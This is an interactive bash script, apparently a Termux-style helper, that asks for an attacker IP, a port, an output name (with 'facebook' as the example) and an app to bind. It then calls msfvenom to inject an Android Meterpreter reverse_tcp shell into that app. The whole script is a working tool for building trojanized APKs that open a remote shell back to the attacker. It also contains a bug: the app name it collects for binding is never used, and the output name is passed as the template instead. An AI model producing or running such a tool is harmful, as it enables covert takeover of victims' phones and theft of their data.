function lhost(){

echo -e $lg " Enter Local Host(your inet IP or public IP "
echo -n -e $ye " [H]: "
read lhost

}
function lport(){

echo -e $lg " Assign Local Port (ex:4444) "
echo -n -e $ye " [P]: "
read lport

}
function pname(){

echo -n -e $lg " [N] Assign a name for output (ex: facebook )"
read name

}
function bind (){

echo -n -e $lg " [B] Type the name of the app  you are going to bind with payload in the HOME directory  : "
read bind

}

echo " "
lhost
echo " "
lport
echo " "
pname
echo " "
bind
echo " "
msfvenom -x $name -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name
